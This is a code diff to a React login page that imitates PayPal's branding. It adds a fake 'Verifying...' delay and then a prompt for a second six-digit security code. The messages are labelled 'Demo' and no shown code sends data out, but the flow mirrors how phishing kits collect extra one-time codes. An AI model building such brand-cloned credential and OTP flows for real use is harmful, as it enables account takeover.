@@ -3,12 +3,13 @@ import { PayPalFullLogo } from "@/components/PayPalLogo";
 import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
-type LoginStep = "email" | "password" | "verify-method" | "verify-code";
+type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2";
 
 export default function LoginPage() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [verificationCode, setVerificationCode] = useState("");
+  const [verificationCode2, setVerificationCode2] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [step, setStep] = useState<LoginStep>("email");
   const [isLoading, setIsLoading] = useState(false);
@@ -57,6 +58,26 @@ export default function LoginPage() {
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
+      setStep("verifying");
+      
+      // After 5 seconds of verifying animation, show second code prompt
+      setTimeout(() => {
+        setStep("verify-code-2");
+        toast({
+          title: "Additional Verification Required",
+          description: `Demo: A second code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+        });
+      }, 5000);
+    }, 800);
+  };
+
+  const handleVerifyCode2 = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (verificationCode2.length < 6) return;
+    
+    setIsLoading(true);
+    setTimeout(() => {
+      setIsLoading(false);
       toast({
         title: "Verification Successful",
         description: "Demo: You would now be logged in to your PayPal account.",
@@ -65,6 +86,7 @@ export default function LoginPage() {
       setEmail("");
       setPassword("");
       setVerificationCode("");
+      setVerificationCode2("");
       setCodeSent(false);
     }, 800);
   };
@@ -73,12 +95,14 @@ export default function LoginPage() {
     setStep("email");
     setPassword("");
     setVerificationCode("");
+    setVerificationCode2("");
     setCodeSent(false);
   };
 
   const handleBackToPassword = () => {
     setStep("password");
     setVerificationCode("");
+    setVerificationCode2("");
     setCodeSent(false);
   };
 
@@ -86,6 +110,107 @@ export default function LoginPage() {
     setStep("verify-method");
     setVerificationCode("");
   };
+
+  const handleBackToFirstCode = () => {
+    setStep("verify-code");
+    setVerificationCode2("");
+  };
+
+  const renderVerifyCode2Step = () => (
+    <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
+      <button
+        type="button"
+        onClick={handleBackToFirstCode}
+        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
+        data-testid="button-back-first-code"
+      >
+        <ChevronLeft className="w-5 h-5" />
+        <span className="text-[14px]">Back</span>
+      </button>
+
+      <div className="flex flex-col items-center mb-6">
+        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
+          {selectedMethod === "sms" ? (
+            <Smartphone className="w-8 h-8 text-[#0070e0]" />
+          ) : (
+            <Mail className="w-8 h-8 text-[#0070e0]" />
+          )}
+        </div>
+        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
+          Enter second security code
+        </h2>
+        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
+          We sent a new code to {selectedMethod === "sms" ? maskedPhone : maskedEmail}
+        </p>
+      </div>
+
+      <div className="space-y-5">
+        <div>
+          <input
+            type="text"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            placeholder="Enter 6-digit code"
+            value={verificationCode2}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
+              setVerificationCode2(value);
+            }}
+            className="paypal-input text-center text-[20px] tracking-[0.5em] font-medium"
+            data-testid="input-code-2"
+            autoFocus
+            maxLength={6}
+          />
+          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-2">
+            Demo: Enter any 6 digits
+          </p>
+        </div>
+
+        <button
+          type="submit"
+          className="paypal-btn-primary flex items-center justify-center gap-2"
+          disabled={verificationCode2.length < 6 || isLoading}
+          data-testid="button-verify-2"
+        >
+          {isLoading ? (
+            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+          ) : (
+            "Confirm"
+          )}
+        </button>
+
+        <div className="text-center">
+          <button
+            type="button"
+            className="paypal-btn-text"
+            data-testid="button-resend-2"
+            onClick={() => {
+              toast({
+                title: "Code Resent",
+                description: `Demo: A new code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+              });
+            }}
+          >
+            Resend code
+          </button>
+        </div>
+
+        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
+          <button
+            type="button"
+            className="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-[#f5f5f5] dark:hover:bg-[#2a2a2a] transition-colors"
+            data-testid="button-try-another-2"
+            onClick={handleBackToVerifyMethod}
+          >
+            <div className="w-8 h-8 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
+              <Lock className="w-4 h-4 text-[#0070e0]" />
+            </div>
+            <span className="text-[14px] text-[#0070e0] font-medium">Try another way</span>
+          </button>
+        </div>
+      </div>
+    </form>
+  );
 
   const footerLinks = [
     "Help",
@@ -352,6 +477,23 @@ export default function LoginPage() {
     </div>
   );
 
+  const renderVerifyingStep = () => (
+    <div data-testid="form-verifying" className="flex flex-col items-center justify-center py-12">
+      <div className="mb-8 relative">
+        <div className="w-24 h-24 animate-pulse">
+          <PayPalFullLogo className="w-full h-full" />
+        </div>
+        <div className="absolute -inset-4 rounded-full border-4 border-[#0070e0] border-t-transparent animate-spin" />
+      </div>
+      <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
+        Verifying...
+      </h2>
+      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[300px]">
+        Please wait while we verify your information
+      </p>
+    </div>
+  );
+
   const renderVerifyCodeStep = () => (
     <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
       <button
@@ -463,6 +605,8 @@ export default function LoginPage() {
           {step === "password" && renderPasswordStep()}
           {step === "verify-method" && renderVerifyMethodStep()}
           {step === "verify-code" && renderVerifyCodeStep()}
+          {step === "verifying" && renderVerifyingStep()}
+          {step === "verify-code-2" && renderVerifyCode2Step()}
         </div>
 
         {/* Security Badge */}
